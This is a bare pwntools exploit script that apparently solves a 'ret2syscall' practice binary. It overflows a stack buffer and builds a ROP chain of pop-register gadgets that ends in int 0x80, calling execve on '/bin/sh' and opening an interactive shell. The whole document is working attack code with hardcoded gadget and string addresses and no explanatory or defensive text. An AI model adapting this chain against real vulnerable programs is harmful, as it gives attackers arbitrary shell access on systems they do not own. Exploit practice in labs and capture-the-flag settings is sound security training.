from pwn import *
sh = process('./ret2syscall')
esp = 0xffffd270
ebp = 0xffffd2f8
v4_offset = 0x1c
pop_eax_ret = 0x080bb196
pop_ecx_ebx_ret = 0x0806eb91
pop_edx_ret = 0x0806eb6a
int_0x80 = 0x08049421
binsh = 0x80be408
payload = flat(
			[b"A" * (ebp-esp-v4_offset+4), pop_eax_ret, 0xb, pop_edx_ret, 0, pop_ecx_ebx_ret, 0, binsh, int_0x80]
		)
sh.sendline(payload)
sh.interactive()
